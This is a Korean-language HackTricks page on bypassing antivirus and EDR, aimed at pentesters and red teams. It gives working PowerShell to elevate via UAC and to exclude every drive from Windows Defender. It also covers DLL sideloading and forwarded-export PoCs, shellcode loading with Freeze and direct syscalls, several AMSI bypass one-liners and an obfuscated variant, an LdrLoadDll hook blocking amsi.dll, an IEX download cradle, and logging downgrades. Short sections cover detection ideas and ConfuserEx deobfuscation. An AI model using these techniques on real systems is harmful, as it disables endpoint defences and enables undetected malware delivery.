# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**이 페이지는 처음에** [**@m2rc_p**](https://twitter.com/m2rc_p)**에 의해 작성되었습니다!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않도록 멈추게 하는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV인 것처럼 가장해 Windows Defender가 작동하지 않도록 멈추게 하는 도구.
- [관리자라면 Defender 비활성화](basic-powershell-for-pentesters/README.md)

### Defender를 건드리기 전에 설치 프로그램 스타일의 UAC bait

게임 cheat로 가장한 공개 loader는 종종 서명되지 않은 Node.js/Nexe installer 형태로 배포되며, 먼저 **사용자에게 권한 상승을 요청**한 뒤에 Defender를 무력화합니다. 흐름은 간단합니다:

1. `net session`으로 관리자 컨텍스트를 확인합니다. 이 명령은 호출자가 admin 권한을 가질 때만 성공하므로, 실패하면 loader가 일반 사용자로 실행 중임을 의미합니다.
2. 원래 command line을 유지한 채 `RunAs` verb로 즉시 자기 자신을 다시 실행하여, 예상되는 UAC consent prompt를 띄웁니다.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
피해자들은 이미 자신이 “cracked” software를 설치하고 있다고 믿고 있으므로, 보통 이 프롬프트를 수락하며, 그 결과 malware가 Defender의 정책을 변경하는 데 필요한 권한을 얻게 됩니다.

### 모든 드라이브 문자에 대한 광범위한 `MpPreference` exclusions

권한이 상승되면, GachiLoader-style 체인은 서비스를 완전히 비활성화하는 대신 Defender의 blind spot을 최대화합니다. loader는 먼저 GUI watchdog(`taskkill /F /IM SecHealthUI.exe`)을 종료한 다음, **매우 광범위한 exclusions**을 적용하여 모든 user profile, system directory, 그리고 removable disk를 스캔할 수 없게 만듭니다:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- 루프는 마운트된 모든 파일 시스템(D:\, E:\, USB sticks 등)을 순회하므로 **디스크의 어디에든 나중에 떨어뜨린 payload는 모두 무시됩니다**.
- `.sys` 확장자 제외는 미래 지향적입니다. 공격자는 Defender를 다시 건드리지 않고 나중에 서명되지 않은 드라이버를 로드할 옵션을 남겨둡니다.
- 모든 변경 사항은 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 아래에 저장되므로, 이후 단계에서 예외가 유지되는지 확인하거나 UAC를 다시 트리거하지 않고 예외를 확장할 수 있습니다.

Defender 서비스는 중지되지 않기 때문에, 단순한 상태 점검은 여전히 “antivirus active”라고 보고하지만 실제 실시간 검사는 해당 경로들을 전혀 건드리지 않습니다.

## **AV Evasion Methodology**

현재 AV들은 파일이 malicious한지 아닌지 확인하기 위해 static detection, dynamic analysis, 그리고 더 고급 EDR의 경우 behavioural analysis 같은 서로 다른 방법을 사용합니다.

### **Static detection**

Static detection은 바이너리나 스크립트 안에 알려진 malicious 문자열이나 바이트 배열이 있는지 확인하고, 파일 자체에서 정보(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, checksum 등)를 추출하여 탐지합니다. 이는 이미 알려진 public tools를 사용하면 더 쉽게 잡힐 수 있다는 뜻인데, 아마 이미 분석되어 malicious로 표시되었을 가능성이 크기 때문입니다. 이런 종류의 탐지를 우회하는 방법은 몇 가지가 있습니다:

- **Encryption**

바이너리를 encrypt하면 AV가 프로그램을 탐지할 방법이 없어지지만, 메모리에서 프로그램을 decrypt하고 실행할 loader가 필요합니다.

- **Obfuscation**

때로는 바이너리나 스크립트의 문자열 몇 개만 바꿔도 AV를 통과할 수 있지만, 무엇을 obfuscate하려는지에 따라 시간이 많이 걸릴 수 있습니다.

- **Custom tooling**

직접 도구를 개발하면 알려진 bad signature가 없지만, 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 static detection을 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 나눈 뒤 Defender에게 각 세그먼트를 개별적으로 scan하게 하므로, 바이너리에서 정확히 어떤 문자열이나 바이트가 flagged 되었는지 알 수 있습니다.

실전 AV Evasion에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 꼭 확인해 보시길 강력히 추천합니다.

### **Dynamic analysis**

Dynamic analysis는 AV가 sandbox에서 바이너리를 실행하고 malicious activity(예: 브라우저 비밀번호를 decrypt하고 읽으려 시도, LSASS에 대해 minidump 수행 등)를 감시하는 것입니다. 이 부분은 다루기 조금 더 까다로울 수 있지만, sandbox를 우회하기 위해 할 수 있는 일들이 있습니다.

- **Sleep before execution** 구현 방식에 따라 AV의 dynamic analysis를 우회하는 아주 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 scan할 시간이 매우 짧으므로, 긴 sleep을 사용하면 바이너리 분석을 방해할 수 있습니다. 문제는 많은 AV sandbox가 구현 방식에 따라 sleep을 그냥 건너뛸 수 있다는 점입니다.
- **Checking machine's resources** 보통 Sandboxes는 사용할 수 있는 리소스가 매우 적습니다(예: < 2GB RAM). 그렇지 않으면 사용자의 머신을 느리게 만들 수 있기 때문입니다. 여기서도 창의적으로 접근할 수 있는데, 예를 들어 CPU temperature나 fan speeds까지 확인할 수 있습니다. sandbox에 모든 것이 구현되어 있지는 않습니다.
- **Machine-specific checks** "contoso.local" domain에 joined 된 사용자의 workstation을 target으로 삼고 싶다면, 컴퓨터의 domain을 확인해서 지정한 값과 일치하는지 볼 수 있습니다. 일치하지 않으면 프로그램을 종료하게 만들 수 있습니다.

Microsoft Defender의 Sandbox computername은 HAL9TH인 것으로 알려져 있습니다. 따라서 detonaton 전에 malware에서 computer name을 확인할 수 있고, 이름이 HAL9TH와 일치하면 Defender sandbox 안에 있다는 뜻이므로 프로그램을 종료하게 만들 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)가 Sandboxes에 대응할 때 유용하다고 한 다른 팁들도 매우 좋습니다.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

이 글에서 앞서 말했듯이, **public tools**는 결국 **detected** 됩니다. 따라서 스스로에게 이런 질문을 해야 합니다:

예를 들어 LSASS를 dump하려고 할 때, **정말 mimikatz를 써야 할까요**? 아니면 덜 알려졌고 LSASS도 dump할 수 있는 다른 프로젝트를 사용할 수 있을까요?

정답은 아마 후자일 것입니다. mimikatz를 예로 들면, 아마 AV와 EDR이 가장 많이 flag하는 malware 중 하나일 텐데, 아니라고 해도 상위권일 것입니다. 프로젝트 자체는 정말 훌륭하지만, AV를 우회하면서 사용하기에는 아주 골치 아픕니다. 그러니 달성하려는 목표에 맞는 대안을 찾아보세요.

> [!TIP]
> evasion을 위해 payload를 수정할 때는 Defender에서 **automatic sample submission**을 꺼 두고, 목표가 장기적인 evasion이라면 정말로 **DO NOT UPLOAD TO VIRUSTOTAL** 하세요. 특정 AV에서 payload가 detected 되는지 확인하고 싶다면 VM에 설치하고 automatic sample submission을 끄려고 한 뒤, 결과가 만족스러울 때까지 그 환경에서 test하세요.

## EXEs vs DLLs

가능하다면 항상 evasion을 위해 **DLLs 사용을 우선**하세요. 경험상 DLL files는 보통 **훨씬 덜 detected** 되고 분석되므로, 어떤 경우에는 detection을 피하기 위한 매우 간단한 trick입니다(물론 payload가 DLL로 실행될 방법이 있을 때의 이야기입니다).

이 이미지에서 볼 수 있듯이, Havoc의 DLL Payload는 antiscan.me에서 detection rate가 4/26인 반면, EXE payload는 7/26입니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

이제 훨씬 더 stealthier하게 만들기 위해 DLL files에 사용할 수 있는 몇 가지 trick을 보여드리겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 loader가 사용하는 DLL search order를 활용하는 기법으로, victim application과 malicious payload(s)를 나란히 배치합니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 powershell script를 사용해 DLL Sideloading에 취약한 programs를 확인할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내에서 DLL hijacking에 취약한 프로그램 목록과 그들이 로드하려고 시도하는 DLL 파일을 출력합니다.

여러분이 직접 **DLL Hijackable/Sideloadable programs**를 탐색해보는 것을 강력히 권장합니다. 이 기법은 제대로 사용하면 꽤 은밀하지만, 공개적으로 알려진 DLL Sideloadable programs를 사용하면 쉽게 들킬 수 있습니다.

프로그램이 로드할 것으로 예상하는 이름의 malicious DLL을 그냥 배치하는 것만으로는 payload가 로드되지 않습니다. 프로그램은 해당 DLL 안에 특정 함수들을 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 또 다른 기법을 사용합니다.

**DLL Proxying**은 program이 proxy(그리고 malicious) DLL을 통해 수행하는 호출을 original DLL로 전달하여, program의 기능을 유지하면서 payload의 실행도 처리할 수 있게 합니다.

저는 [@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용할 것입니다.

제가 따랐던 단계는 다음과 같습니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 우리에게 2개의 파일을 줍니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
다음은 결과입니다:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 shellcode([SGN](https://github.com/EgeBalci/sgn)으로 인코딩됨)와 proxy DLL 모두 [antiscan.me](https://antiscan.me)에서 Detection rate 0/26입니다! 성공이라고 부를 만하네요.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 저는 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)에서의 DLL Sideloading과 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)를 **강력히 추천**합니다. 더 깊이 있게 우리가 논의한 내용을 배우는 데 도움이 됩니다.

### Forwarded Exports 악용하기 (ForwardSideLoading)

Windows PE module은 실제로는 "forwarder"인 function을 export할 수 있습니다: code를 가리키는 대신, export entry에 `TargetDll.TargetFunc` 형태의 ASCII string이 들어 있습니다. caller가 export를 resolve하면 Windows loader는 다음을 수행합니다:

- 아직 load되지 않았다면 `TargetDll`을 load
- 그 안에서 `TargetFunc`를 resolve

이해해야 할 핵심 동작:
- `TargetDll`이 KnownDLL이면, 보호된 KnownDLLs namespace에서 제공됩니다(예: ntdll, kernelbase, ole32).
- `TargetDll`이 KnownDLL이 아니면, 일반 DLL search order가 사용되며, 여기에는 forward resolution을 수행하는 module의 directory가 포함됩니다.

이것은 간접적인 sideloading primitive를 가능하게 합니다: non-KnownDLL module name으로 forward된 function을 export하는 signed DLL을 찾은 다음, 그 signed DLL을 공격자가 제어하는 DLL과 같은 위치에 두되, 그 DLL의 이름을 forwarded target module과 정확히 동일하게 맞춥니다. forwarded export가 호출되면 loader는 forward를 resolve하고 같은 directory에서 당신의 DLL을 load하여 DllMain을 실행합니다.

Windows 11에서 관찰된 예시:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로, 일반 검색 순서를 통해 확인됩니다.

PoC (copy-paste):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사하십시오
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을 drop한다. 최소한의 DllMain만 있어도 code execution을 얻을 수 있으며, DllMain을 trigger하기 위해 forwarded function을 구현할 필요는 없다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 forward를 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
관찰된 동작:
- rundll32 (signed)가 side-by-side `keyiso.dll` (signed)를 로드함
- `KeyIsoSetAuditingInterface`를 확인하는 동안, 로더는 forward를 따라 `NCRYPTPROV.SetAuditingInterface`로 이동함
- 그다음 로더는 `C:\test`에서 `NCRYPTPROV.dll`를 로드하고 그 `DllMain`을 실행함
- `SetAuditingInterface`가 구현되지 않았더라도, "missing API" 오류는 `DllMain`이 이미 실행된 뒤에야 발생함

탐색 팁:
- 대상 모듈이 KnownDLL이 아닌 forwarded exports에 집중하라. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 아래에 나열됨.
- 다음과 같은 tooling으로 forwarded exports를 열거할 수 있음:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 검색하려면 Windows 11 forwarder inventory를 확인하세요: https://hexacorn.com/d/apis_fwd.txt

Detection/defense 아이디어:
- non-system 경로에서 signed DLL을 로드한 뒤, 같은 base name을 가진 해당 디렉터리의 non-KnownDLLs를 로드하는 LOLBins(예: rundll32.exe)를 모니터링
- 다음과 같은 process/module chain에 대해 alert: `rundll32.exe` → non-system `keyiso.dll` → user-writable 경로의 `NCRYPTPROV.dll`
- code integrity policies(WDAC/AppLocker)를 적용하고 application directories에서 write+execute를 차단

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze를 사용하면 stealthy하게 shellcode를 load하고 execute할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion은 그저 고양이와 쥐 게임일 뿐이며, 오늘 통하는 방법이 내일은 탐지될 수 있으므로, 절대 하나의 tool에만 의존하지 말고, 가능하다면 여러 evasion techniques를 체이닝해 보라.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR은 종종 `ntdll.dll` syscall stubs에 **user-mode inline hooks**를 건다. 이러한 hooks를 우회하려면, 올바른 **SSN**(System Service Number)을 로드하고 hooked export entrypoint를 실행하지 않은 채 kernel mode로 전환하는 **direct** 또는 **indirect** syscall stubs를 생성하면 된다.

**Invocation options:**
- **Direct (embedded)**: 생성된 stub에 `syscall`/`sysenter`/`SVC #0` instruction을 직접 넣는다(`ntdll` export hit 없음).
- **Indirect**: `ntdll` 내부의 기존 `syscall` gadget으로 점프하여 kernel 전환이 `ntdll`에서 시작된 것처럼 보이게 한다(heuristic evasion에 유용함); **randomized indirect**는 호출마다 pool에서 gadget을 하나 선택한다.
- **Egg-hunt**: 디스크에 정적인 `0F 05` opcode sequence를 박아 넣지 않도록 하고, runtime에 syscall sequence를 resolve한다.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes를 읽지 않고 syscall stubs를 virtual address 순으로 정렬해 SSN을 추론한다.
- **SyscallsFromDisk**: 깨끗한 `\KnownDlls\ntdll.dll`를 map한 뒤, 그 `.text`에서 SSN을 읽고 unmap한다(메모리상의 모든 hooks를 bypass).
- **RecycledGate**: stub가 clean하면 VA-sorted SSN inference와 opcode validation을 결합하고, hooked되어 있으면 VA inference로 fall back한다.
- **HW Breakpoint**: `syscall` instruction에 DR0를 설정하고 VEH를 사용해 runtime에 `EAX`에서 SSN을 capture하며, hooked bytes를 파싱하지 않는다.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌다. 초기에는 AV가 **디스크상의 파일만** 스캔할 수 있었기 때문에, 어떤 방식으로든 payload를 **직접 메모리에서 실행**할 수 있다면 AV는 이를 막을 수 없었다. AV가 볼 수 있는 정보가 충분하지 않았기 때문이다.

AMSI 기능은 다음 Windows 구성 요소들에 통합되어 있다.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

이는 script 내용을 암호화되지 않고 obfuscation되지 않은 형태로 노출해, antivirus 솔루션이 script 동작을 검사할 수 있게 해준다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 alert가 발생한다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

여기서 `amsi:`를 앞에 붙이고, 그다음 script가 실행된 executable의 path를 표시한다는 점에 주목하자. 이 경우 powershell.exe이다.

우리는 어떤 파일도 disk에 drop하지 않았지만, AMSI 때문에 메모리 상에서 여전히 탐지되었다.

또한 **.NET 4.8**부터는 C# code도 AMSI를 통해 실행된다. 이는 in-memory execution을 위해 `Assembly.Load(byte[])`를 사용하는 경우에도 영향을 준다. 그래서 AMSI를 evasion하려는 in-memory execution에서는 더 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장된다.

AMSI를 우회하는 방법은 몇 가지가 있다.

- **Obfuscation**

AMSI는 주로 static detections에 기반하므로, 로드하려는 script를 수정하는 것은 detection evasion에 좋은 방법이 될 수 있다.

하지만 AMSI는 여러 겹의 obfuscation이 있더라도 script를 unobfuscating할 수 있는 기능이 있으므로, 방법에 따라 obfuscation은 좋지 않은 선택일 수 있다. 따라서 evasion은 그리 단순하지 않다. 다만 때로는 variable name 몇 개만 바꿔도 충분할 수 있으므로, 얼마나 탐지되었는지에 따라 다르다.

- **AMSI Bypass**

AMSI는 powershell(또는 cscript.exe, wscript.exe 등) process에 DLL을 load하는 방식으로 구현되어 있기 때문에, unprivileged user로 실행 중이더라도 쉽게 조작할 수 있다. AMSI 구현상의 이 결함 때문에 연구자들은 AMSI scanning을 evasion하는 여러 방법을 찾아냈다.

**Forcing an Error**

AMSI initialization이 실패하도록 강제(amsiInitFailed)하면 현재 process에 대해서는 scan이 시작되지 않는다. 이 기법은 원래 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었고, Microsoft는 더 널리 사용되는 것을 막기 위한 signature를 개발했다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
AMSI를 현재 powershell 프로세스에서 사용할 수 없게 만드는 데는 powershell 코드 한 줄이면 충분했다. 물론 이 한 줄은 AMSI 자체에 의해 플래그되었기 때문에, 이 기법을 사용하려면 약간의 수정이 필요하다.

여기 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass가 있다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기술은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 발견되었고, amsi.dll에서 "AmsiScanBuffer" 함수의 주소를 찾아(사용자 입력을 검사하는 역할) 이를 `E_INVALIDARG` 코드를 반환하는 명령어로 덮어쓰는 방식이다. 이렇게 하면 실제 스캔 결과가 0으로 반환되고, 이는 clean 결과로 해석된다.

> [!TIP]
> 더 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보라.

powershell로 AMSI를 bypass하기 위해 사용되는 다른 많은 기술들도 있다. 더 알아보려면 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass)와 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하라.

### amsi.dll 로드를 막아서 AMSI 차단하기 (LdrLoadDll hook)

AMSI는 `amsi.dll`이 현재 프로세스에 로드된 후에만 초기화된다. 강건하고 언어에 구애받지 않는 bypass 방법은 요청된 모듈이 `amsi.dll`일 때 오류를 반환하도록 `ntdll!LdrLoadDll`에 user-mode hook을 거는 것이다. 그 결과 AMSI는 절대 로드되지 않으며, 해당 프로세스에서는 어떠한 스캔도 발생하지 않는다.

구현 개요 (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript 및 custom loaders 모두에서 동작함(AMSI를 로드하는 모든 것에 해당).
- 긴 command-line artefacts를 피하려면 stdin으로 scripts를 전달하는 방식과 함께 사용 (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins를 통해 실행되는 loaders에서 사용되는 것이 관찰됨(예: `regsvr32`가 `DllRegisterServer`를 호출).

툴 **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 도 AMSI를 bypass하는 script를 생성한다.
툴 **[https://amsibypass.com/](https://amsibypass.com/)** 도 randomized user-defined function, variables, characters expression을 사용해 signature를 피하고, PowerShell keywords에 random character casing을 적용해 signature를 피하는 AMSI bypass script를 생성한다.

**Remove the detected signature**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 와 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 툴을 사용해 현재 process의 memory에서 감지된 AMSI signature를 제거할 수 있다. 이 툴은 현재 process의 memory에서 AMSI signature를 스캔한 뒤 이를 NOP instructions로 덮어써서, 사실상 memory에서 제거하는 방식으로 동작한다.

**AV/EDR products that uses AMSI**

AMSI를 사용하는 AV/EDR products 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 에서 찾을 수 있다.

**Use Powershell version 2**
PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로, AMSI에 스캔되지 않고 scripts를 실행할 수 있다. 이렇게 할 수 있다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있게 해주는 기능입니다. 감사와 문제 해결에 유용할 수 있지만, **탐지를 피하려는 공격자에게는 문제가 될 수도 있습니다**.

PowerShell logging을 우회하려면 다음 기술을 사용할 수 있습니다:

- **PowerShell Transcription 및 Module Logging 비활성화**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Powershell version 2 사용**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로, AMSI에 의해 스캔되지 않은 상태로 스크립트를 실행할 수 있습니다. 이렇게 할 수 있습니다: `powershell.exe -version 2`
- **Unmanaged Powershell Session 사용**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)를 사용해 방어 수단 없이 powershell을 실행할 수 있습니다(`Cobal Strike`의 `powerpick`이 사용하는 방식입니다).


## Obfuscation

> [!TIP]
> 여러 obfuscation 기술은 데이터를 encrypt하는 데 의존하는데, 이는 binary의 entropy를 증가시켜 AVs와 EDRs가 탐지하기 더 쉽게 만듭니다. 이 점을 주의하고, 필요한 경우에만 코드 중 민감하거나 숨겨야 하는 특정 섹션에만 encryption을 적용하세요.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 상용 fork)를 사용하는 malware를 분석할 때, decompilers와 sandboxes를 막는 여러 단계의 보호를 마주치는 것이 일반적입니다. 아래 워크플로우는 이후 dnSpy나 ILSpy 같은 도구로 C#으로 decompile할 수 있는 거의 원본에 가까운 IL을 안정적으로 **복원**합니다.

1.  Anti-tampering 제거 – ConfuserEx는 모든 *method body*를 encrypt하고 *module* static constructor (`<Module>.cctor`) 안에서 decrypt합니다. 또한 PE checksum도 패치하므로, 어떤 수정이든 binary가 crash하게 됩니다. **AntiTamperKiller**를 사용해 encrypted metadata tables를 찾고, XOR keys를 복구한 뒤, 깨끗한 assembly를 다시 작성하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 사용자만의 unpacker를 만들 때 유용할 수 있는 6개의 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  Symbol / control-flow 복구 – *clean* 파일을 **de4dot-cex**(ConfuserEx를 인식하는 de4dot fork)에 넣으세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile 선택
• de4dot은 control-flow flattening을 되돌리고, 원래 namespace, class, variable name을 복원하며 constant strings를 decrypt합니다.

3.  Proxy-call 제거 – ConfuserEx는 직접 method call을 더 가벼운 wrapper(a.k.a *proxy calls*)로 바꿔 decompilation을 더 어렵게 만듭니다. **ProxyCall-Remover**로 이를 제거하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 이후에는 `Class8.smethod_10` 같은 불명확한 wrapper function 대신 `Convert.FromBase64String` 또는 `AES.Create()` 같은 일반적인 .NET API가 보여야 합니다.

4.  수동 정리 – 결과 binary를 dnSpy에서 실행한 뒤, 큰 Base64 blob 또는 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색해 *real* payload를 찾으세요. 종종 malware는 이를 `<Module>.byte_0` 안에서 초기화되는 TLV-encoded byte array로 저장합니다.

위 체인은 악성 샘플을 실행하지 않고도 execution flow를 복원합니다. 오프라인 workstation에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 custom attribute를 생성하는데, 이를 IOC로 사용해 샘플을 자동 분류할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

